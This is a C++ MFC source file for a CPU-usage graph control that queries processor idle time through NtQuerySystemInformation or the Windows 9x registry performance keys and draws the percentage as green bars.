// NetCtl.cpp : implementation file
//

#include "stdafx.h"
#include "CpuUsgesCtl.h"
#include "Gh0st.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CCpuUsgesCtl
#define SystemBasicInformation       0
#define SystemPerformanceInformation 2
#define SystemTimeInformation        3

#define Li2Double(x) ((double)((x).HighPart) * 4.294967296E9 + (double)((x).LowPart))

typedef struct
{
    DWORD   dwUnknown1;
    ULONG   uKeMaximumIncrement;
    ULONG   uPageSize;
    ULONG   uMmNumberOfPhysicalPages;
    ULONG   uMmLowestPhysicalPage;
    ULONG   uMmHighestPhysicalPage;
    ULONG   uAllocationGranularity;
    PVOID   pLowestUserAddress;
    PVOID   pMmHighestUserAddress;
    ULONG   uKeActiveProcessors;
    BYTE    bKeNumberProcessors;
    BYTE    bUnknown2;
    WORD    wUnknown3;
} SYSTEM_BASIC_INFORMATION;

typedef struct
{
    LARGE_INTEGER   liIdleTime;
    DWORD           dwSpare[76];
} SYSTEM_PERFORMANCE_INFORMATION;

typedef struct
{
    LARGE_INTEGER liKeBootTime;
    LARGE_INTEGER liKeSystemTime;
    LARGE_INTEGER liExpTimeZoneBias;
    ULONG         uCurrentTimeZoneId;
    DWORD         dwReserved;
} SYSTEM_TIME_INFORMATION;

CCpuUsgesCtl::CCpuUsgesCtl()
{
	m_iRefreshInterval = 10;
	m_fNewUsges        = 40;
	m_ForeFontColor    = RGB(255, 0, 0);
	m_ForeColor        = RGB(0, 150, 0);
	m_BackColor        = RGB(0, 0, 0);	
	m_FreeColor		   = RGB(0, 80, 0);
	m_UsedColor        = RGB(0, 140, 0);
	m_LableColor       = RGB(255, 255, 0);
	m_iGridHeight      = 0;
	m_iGridCount       = 50;
	m_liOldIdleTime.QuadPart   = 0;
    m_liOldSystemTime.QuadPart = 0;

}

CCpuUsgesCtl::~CCpuUsgesCtl()
{
}


BEGIN_MESSAGE_MAP(CCpuUsgesCtl, CWnd)
	//{{AFX_MSG_MAP(CCpuUsgesCtl)
	ON_WM_PAINT()
	ON_WM_CREATE()
	ON_WM_TIMER()
	ON_WM_SIZE()
	ON_WM_SHOWWINDOW()
	ON_WM_ERASEBKGND()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()


/////////////////////////////////////////////////////////////////////////////
// CCpuUsgesCtl message handlers

void CCpuUsgesCtl::OnPaint() 
{
	DrawCpuUsges();  
	CPaintDC dc(this); 
}

int CCpuUsgesCtl::OnCreate(LPCREATESTRUCT lpCreateStruct) 
{
	if (CWnd::OnCreate(lpCreateStruct) == -1)
		return -1;
	return 0;
}

void CCpuUsgesCtl::GetCpuUsgesNt()
{
	SYSTEM_PERFORMANCE_INFORMATION SysPerfInfo;
    SYSTEM_TIME_INFORMATION        SysTimeInfo;
    SYSTEM_BASIC_INFORMATION       SysBaseInfo;
    double                         dbIdleTime;
    double                         dbSystemTime;
    LONG                           status;
    typedef LONG (WINAPI *PROCNTQSI)(UINT,PVOID,ULONG,PULONG);
    PROCNTQSI NtQuerySystemInformation;

    NtQuerySystemInformation = (PROCNTQSI)GetProcAddress(
                                          GetModuleHandle("ntdll"),
                                         "NtQuerySystemInformation"
                                         );

    if (!NtQuerySystemInformation)
	{
        return;
	}

    // get number of processors in the system
    status = NtQuerySystemInformation(SystemBasicInformation,
		                              &SysBaseInfo,sizeof(SysBaseInfo),NULL);

    if (status != NO_ERROR)
	{
        return;
	}

	 status = NtQuerySystemInformation(SystemTimeInformation,
		                               &SysTimeInfo,sizeof(SysTimeInfo),0);
     if (status!=NO_ERROR)
	 {
          return;
	 }

     // get new CPU's idle time
     status = NtQuerySystemInformation(SystemPerformanceInformation,
		                               &SysPerfInfo,sizeof(SysPerfInfo),NULL);

     if (status != NO_ERROR)
	 {
          return;
	 }

     // if it's a first call - skip it
     if (m_liOldIdleTime.QuadPart != 0)
     {
         // CurrentValue = NewValue - OldValue
         dbIdleTime = Li2Double(SysPerfInfo.liIdleTime) - Li2Double(m_liOldIdleTime);
         dbSystemTime = Li2Double(SysTimeInfo.liKeSystemTime) - Li2Double(m_liOldSystemTime);

          // CurrentCpuIdle = IdleTime / SystemTime
          dbIdleTime = dbIdleTime / dbSystemTime;

          // CurrentCpuUsage% = 100 - (CurrentCpuIdle * 100) / NumberOfProcessors
          dbIdleTime = 100.0 - dbIdleTime * 100.0 / (double)SysBaseInfo.bKeNumberProcessors + 0.5;

          m_fNewUsges = (UINT)dbIdleTime;
     }

     // store new CPU's idle and system time
     m_liOldIdleTime = SysPerfInfo.liIdleTime;
     m_liOldSystemTime = SysTimeInfo.liKeSystemTime;

}

void CCpuUsgesCtl::SetRefreshInterval(int iMs)
{
	 m_iRefreshInterval = iMs;
	 SetTimer(1, m_iRefreshInterval, NULL); 
}


void CCpuUsgesCtl::OnTimer(UINT nIDEvent) 
{  	
	if(IsNt())
	{
		GetCpuUsgesNt();
	}
	else
	{
		GetCpuUsges9X();
	}

	Invalidate();

	CWnd::OnTimer(nIDEvent);
}

void CCpuUsgesCtl::SetGridCount(int iNewCounts)
{
    m_iGridCount	= iNewCounts;

}

void CCpuUsgesCtl::SetGridHeight(int iNewHeight)
{
	m_iGridHeight  = iNewHeight;
}

void CCpuUsgesCtl::OnSize(UINT nType, int cx, int cy) 
{ 	
	CWnd::OnSize(nType, cx, cy);
}

void CCpuUsgesCtl::OnShowWindow(BOOL bShow, UINT nStatus) 
{
	CWnd::OnShowWindow(bShow, nStatus);
}

void CCpuUsgesCtl::GetCpuUsges9X()
{
	HKEY hkey;
    DWORD dwDataSize;
    DWORD dwType;
    DWORD dwCpuUsage;

    // starting the counter
    if ( RegOpenKeyEx( HKEY_DYN_DATA,
                       "PerfStats\\StartStat",
                       0,KEY_ALL_ACCESS,
                       &hkey ) != ERROR_SUCCESS
		)
	{
       return;
	}

    dwDataSize=sizeof(DWORD);
    RegQueryValueEx( hkey,
                     "KERNEL\\CPUUsage",
                     NULL,&dwType,
                     (LPBYTE)&dwCpuUsage,
                     &dwDataSize );

    RegCloseKey(hkey);
    
    // geting current counter's value
    if ( RegOpenKeyEx( HKEY_DYN_DATA,
                       "PerfStats\\StatData",
                       0,KEY_READ,
                       &hkey ) != ERROR_SUCCESS)
	{
       return;
	}

    dwDataSize=sizeof(DWORD);
    RegQueryValueEx( hkey,
                     "KERNEL\\CPUUsage",
                      NULL,&dwType,
                      (LPBYTE)&dwCpuUsage,
                      &dwDataSize );

    m_fNewUsges = dwCpuUsage;
    RegCloseKey(hkey);
    
    // stoping the counter
    if ( RegOpenKeyEx( HKEY_DYN_DATA,
                       "PerfStats\\StopStat",
                       0,KEY_ALL_ACCESS,
                       &hkey ) != ERROR_SUCCESS)
	{
       return;
	}

    dwDataSize=sizeof(DWORD);
    RegQueryValueEx( hkey,
                     "KERNEL\\CPUUsage",
                     NULL,&dwType,
                     (LPBYTE)&dwCpuUsage,
                     &dwDataSize );

    RegCloseKey(hkey);
}

BOOL CCpuUsgesCtl::IsNt()
{
	DWORD winVer;
   
	winVer = GetVersion();

	if(winVer<0x80000000)
	{
	   return TRUE;
	}

	return FALSE;
}

void CCpuUsgesCtl::DrawCpuUsges()
{
   	CDC memDC;
	CString strLable;
	CBitmap memBitmap;
	CBitmap* pOldBmp = NULL;	
	CString strUsges;
	CPen BackFreePen;
	CPen BackUsedPen;
	CPen *pOldPen    = NULL;
	CPen *pOldMemPen = NULL;
	CRect rectClient;

	CPaintDC dc(this);

	GetClientRect(&rectClient);
	m_iGridHeight = rectClient.Height() / m_iGridCount;

	//draw cpu free usges
	BackFreePen.CreatePen(PS_SOLID, m_iGridHeight - 2, m_FreeColor);

	memDC.CreateCompatibleDC(&dc);
	pOldMemPen = memDC.SelectObject(&BackFreePen);
	memBitmap.CreateCompatibleBitmap(&dc, rectClient.right, rectClient.bottom);
	pOldBmp = memDC.SelectObject(&memBitmap);

	memDC.FillSolidRect(rectClient, m_BackColor);

	for(int i = 0; i < 50 - (int)(m_fNewUsges / 2); i ++)   
	{
		memDC.MoveTo(rectClient.left + 12,  rectClient.top + i * m_iGridHeight + 12);
		memDC.LineTo(rectClient.right - 12, rectClient.top + i * m_iGridHeight + 12);
	}

	//draw cpu used usges
	BackUsedPen.CreatePen(PS_SOLID, m_iGridHeight - 2, m_UsedColor);
	memDC.SelectObject(&BackUsedPen);

	for(int j = 0; j < (int)(m_fNewUsges / 2); j ++)	   //fill used percent
	{
		memDC.MoveTo(rectClient.left + 12,  rectClient.bottom - j * m_iGridHeight - 12);
		memDC.LineTo(rectClient.right - 12, rectClient.bottom - j * m_iGridHeight - 12);
	}

	strLable = _T("cpu");
	memDC.SetBkMode(TRANSPARENT);
	memDC.SetTextAlign(TA_LEFT | TA_CENTER);
	memDC.SetTextColor(m_LableColor);
	memDC.TextOut(rectClient.left + 25, rectClient.top + 30, strLable);

	strUsges.Format("%d", (int)m_fNewUsges);
	strUsges += "%";
	memDC.SetTextColor(m_ForeFontColor);
	memDC.TextOut(rectClient.left + rectClient.Width() / 2 - 10, rectClient.bottom - 60, strUsges);

	dc.BitBlt(rectClient.left, rectClient.top, rectClient.right, rectClient.bottom, &memDC, 0, 0, SRCCOPY);

	memDC.SelectObject(pOldBmp);
	memDC.SelectObject(pOldMemPen);
	memDC.DeleteDC();
	memBitmap.DeleteObject();
}

BOOL CCpuUsgesCtl::OnEraseBkgnd(CDC* pDC) 
{
	return TRUE;//CWnd::OnEraseBkgnd(pDC);
}

BOOL CCpuUsgesCtl::Create(DWORD dwStyle, const RECT& rect, CWnd* pParentWnd, UINT nID) 
{
	
	return CWnd::Create(NULL, NULL, dwStyle, rect, pParentWnd, nID, NULL);
}
